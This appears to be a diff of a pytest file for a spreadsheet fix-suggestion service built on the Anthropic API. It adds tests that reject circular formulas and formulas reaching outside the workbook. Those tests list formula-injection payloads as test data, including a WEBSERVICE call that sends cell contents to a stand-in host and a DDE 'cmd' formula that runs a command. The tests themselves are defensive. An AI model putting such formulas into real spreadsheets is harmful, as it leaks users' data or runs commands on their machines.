@@ -51,7 +51,7 @@ def test_fix_route_503_without_key(monkeypatch):
 def test_fix_route_passes_request_through(monkeypatch):
     monkeypatch.setattr(triage, "api_key_configured", lambda: True)
     seen = {}
-    fake = {"explanation": "Median of Units.", "changes": [{"cell": "C3", "new": "=MEDIAN(C2:C4)"}]}
+    fake = {"explanation": "Median of Units.", "changes": [{"cell": "C3", "new": "=MEDIAN(C2,C4)"}]}
     monkeypatch.setattr(triage, "suggest_fix", lambda *a: seen.setdefault("args", a) and fake)
     r = post({**BODY, "intent": None})
     assert r.status_code == 200 and r.get_json() == fake
@@ -87,7 +87,7 @@ def stub_api(monkeypatch, content, stop="end_turn"):
 def test_suggest_fix_through_real_sdk(monkeypatch):
     """Real anthropic SDK request + structured-output parse."""
     answer = {"explanation": "Use the median.", "changes": [
-        {"cell": "c3", "new": "=MEDIAN(C2:C4)"}, {"cell": "$C$4", "new": "50"},
+        {"cell": "c3", "new": "=MEDIAN(C2,C4)"}, {"cell": "$C$4", "new": "50"},
         {"cell": "Sheet1!C3", "new": "1"}, {"cell": "C0", "new": "1"}]}
     srv, sent = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
     try:
@@ -96,7 +96,7 @@ def test_suggest_fix_through_real_sdk(monkeypatch):
         srv.shutdown()
     # lower-cased and $-anchored addresses are normalised; sheet-qualified and row 0 are dropped
     assert out == {"explanation": "Use the median.",
-                   "changes": [{"cell": "C3", "new": "=MEDIAN(C2:C4)"}, {"cell": "C4", "new": "50"}]}
+                   "changes": [{"cell": "C3", "new": "=MEDIAN(C2,C4)"}, {"cell": "C4", "new": "50"}]}
     assert sent[0]["model"] == triage.MODEL
     assert sent[0]["output_config"]["format"]["type"] == "json_schema"
     assert "median please" in sent[0]["messages"][0]["content"]
@@ -111,3 +111,53 @@ def test_fix_route_explains_refusal_and_cut_off_answers(monkeypatch):
         finally:
             srv.shutdown()
         assert r.status_code == 502 and msg in r.get_json()["error"], r.get_json()
+
+
+def test_refers_to_itself_catches_circular_formulas():
+    loops = ["=MEDIAN(C2:C41)", "=C11*2", "=$C$11+1", "=SUM(C:C)", "=SUM(B:D)", "=MEDIAN(C$2:C$40)"]
+    loops += ["=SUM(C41:C2)", "=SUM(D20:B5)"]
+    fine = ["=AVERAGE(Data!C2:C11)", "=MEDIAN(C2:C10,C12:C41)", "=SUM(A:B)", "=LOG10(C5)", "50", '="C11"', "=Other!C11", "=TRUE", "=ROUND(C12,0)",
+            '=AVERAGEIFS(C2:C10,B2:B10,"East")']
+    assert all(triage.refers_to_itself("C11", f) for f in loops)
+    assert not any(triage.refers_to_itself("C11", f) for f in fine)
+    assert triage.refers_to_itself("AA3", "=AVERAGE(Z1:AB9)")
+
+
+def test_suggest_fix_drops_circular_formula(monkeypatch):
+    answer = {"explanation": "Median.", "changes": [{"cell": "C3", "new": "=MEDIAN(C2:C4)"},
+                                                   {"cell": "D3", "new": "=MEDIAN(D2,D4)"}]}
+    srv, sent = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
+    try:
+        out = triage.suggest_fix(COLS, ROWS, 1, 0, 0, "low", "")
+    finally:
+        srv.shutdown()
+    assert out["changes"] == [{"cell": "D3", "new": "=MEDIAN(D2,D4)"}]
+    assert "Left out C3" in out["explanation"]
+    assert "never refer to the cell it is written into" in sent[0]["messages"][0]["content"]
+
+
+def test_suggest_fix_drops_formulas_that_reach_outside_the_workbook(monkeypatch):
+    bad = ['=WEBSERVICE("https://x/?"&A2)', '=IMAGE("https://x/a.png")', '=HYPERLINK("http://x","go")',
+           "=[Other.xlsx]Sheet1!A1", "=FILTERXML(A1,\"//a\")", "=cmd|'/c calc'!A1", '+WEBSERVICE("https://x")',
+           ' @HYPERLINK("http://x")']
+    answer = {"explanation": "x", "changes": [{"cell": f"D{k + 2}", "new": f} for k, f in enumerate(bad)]
+              + [{"cell": "E2", "new": "=AVERAGEIFS(C2:C3,B2:B3,\"East\")"}, {"cell": "E3", "new": "imaging"}]}
+    srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
+    try:
+        out = triage.suggest_fix(COLS, ROWS, 1, 0, 0, "", "")
+    finally:
+        srv.shutdown()
+    assert [c["cell"] for c in out["changes"]] == ["E2", "E3"]  # plain text values are never formulas
+    assert "reached outside this workbook" in out["explanation"]
+
+
+def test_engine_reason_wording_the_panel_reads():
+    """panel/taskpane.js recommendFix parses these engine phrases - keep them in step."""
+    c = create_app().test_client()
+    cols = ["id", "Units"]
+    rows = [[k, 10 + k % 3] for k in range(60)] + [[99, ""], [7, "12O"], [5, 12]]
+    rows[5] = [5, 12]
+    reasons = " | ".join(r["reason"] for r in c.post("/scan", json={"columns": cols, "rows": rows, "limits": {}}).get_json()["rows"])
+    assert "Blank cell in column Units, which" in reasons
+    assert 'Text "12O" in number column Units' in reasons
+    assert "Duplicate of row 7" in reasons
